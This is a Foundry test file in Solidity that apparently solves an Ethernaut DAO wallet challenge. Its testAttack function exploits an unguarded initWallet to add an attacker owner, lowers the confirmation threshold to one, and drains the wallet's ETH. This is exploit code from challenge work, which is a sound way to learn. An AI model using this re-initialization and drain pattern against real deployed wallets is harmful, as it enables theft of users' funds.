// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernautDao/Wallet.sol";
import "../../src/ethernautDao/WalletLibrary.sol";

contract WalletTest is Test {
    Wallet public wallet;
    WalletLibrary public walletLibrary;
    address[] public owners;
    address public alice;
    address public bob;
    address public joe;
    address public marvel;

    event Pay(uint256 amount, address sender);

    function setUp() public {
        alice = vm.addr(1);
        bob = vm.addr(2);
        joe = vm.addr(3);
        owners = [alice, bob, joe];
        walletLibrary = new WalletLibrary();
        wallet = new Wallet(address(walletLibrary), owners, 2);
    }

    function testVariables() public {
        assertEq(wallet.walletLibrary(), address(walletLibrary));
        assertEq(wallet.numConfirmationsRequired(), 2);
        assertEq(wallet.owners(0), alice);
        assertEq(wallet.owners(1), bob);
        assertEq(wallet.owners(2), joe);
    }

    function testAttack() public {
        // set address balance to 1 eth
        vm.deal(address(wallet), 1 ether);

        // initWallet() has no access control so anyone can call it passing an new parameters.
        // initialize wallet with an extra address ie. attacker address and requiredConmfirmations set to 1.
        marvel = vm.addr(4);
        address[] memory new_owner = new address[](1);
        new_owner[0] = marvel;
        (bool success, ) = address(wallet).call(
            abi.encodeWithSignature(
                "initWallet(address[],uint256)",
                new_owner,
                1
            )
        );
        assert(success);

        assertEq(wallet.owners(3), marvel);
        assertEq(wallet.numConfirmationsRequired(), 1);

        // set msg.sender to attacker address
        vm.startPrank(marvel);

        // submit a new transaction to transfer out all ETH
        (bool success2, ) = address(wallet).call(
            abi.encodeWithSignature(
                "submitTransaction(address,uint256,bytes)",
                address(marvel),
                address(wallet).balance,
                ""
            )
        );
        assert(success2);

        // confirm transaction
        (bool success3, ) = address(wallet).call(
            abi.encodeWithSignature("confirmTransaction(uint256)", 0)
        );
        assert(success3);

        // execute transaction
        // requiredConmfirmations which is currently 1 has been met.
        (bool success4, ) = address(wallet).call(
            abi.encodeWithSignature("executeTransaction(uint256)", 0)
        );
        assert(success4);

        assertEq(address(marvel).balance, 1 ether);
    }
}
